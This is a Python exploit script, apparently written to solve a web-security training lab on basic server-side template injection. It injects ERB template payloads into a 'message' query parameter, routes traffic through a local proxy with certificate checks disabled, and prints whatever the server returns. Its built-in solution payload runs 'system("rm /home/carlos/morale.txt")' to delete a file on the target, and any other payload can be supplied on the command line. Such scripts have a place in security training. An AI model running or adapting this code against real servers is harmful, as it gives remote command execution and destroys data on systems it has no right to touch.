# Basic server-side template injection

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}



##########################################################
#	FUNCTIONS
##########################################################


def send_payload(url, payload):
	query_param = '/?message='
	if payload == 'SOLUTION':
		payload = '<% system("rm /home/carlos/morale.txt") %>'
	inject = payload.replace('%', '%25').replace(' ', '+')
	print("\n[+] Trying inject payload '%s' on the target website..." % inject)
	print(f"[+] Sending get request on {query_param}{inject}\n")
	r = requests.get(url + query_param + inject, verify=False, proxies=proxies)
	time.sleep(1)
	if r.status_code == 200:
		result = re.search(b"""<div>(.*)\n</div>""", r.text.encode()).group(1)
	elif r.status_code == 500 and re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()):
		result = re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()).group(1)
	else:
		print("[-] Command Injection Failed !!!")
		sys.exit(0)
	print("[+] %s\'s output:" % url)
	print('\t%s' % result.decode())
	print("[+] Command Injection Successful !!!")


##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: Basic server-side template injection')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
		print(f'[+] Example: {sys.argv[0]} https://www.target.com "<%= 6*7 %>"')
		print('[+] Example: %s https://www.target.com SOLUTION' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			send_payload(url, payload)
			time.sleep(2)
			r = requests.get(url, verify=False, proxies=proxies)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()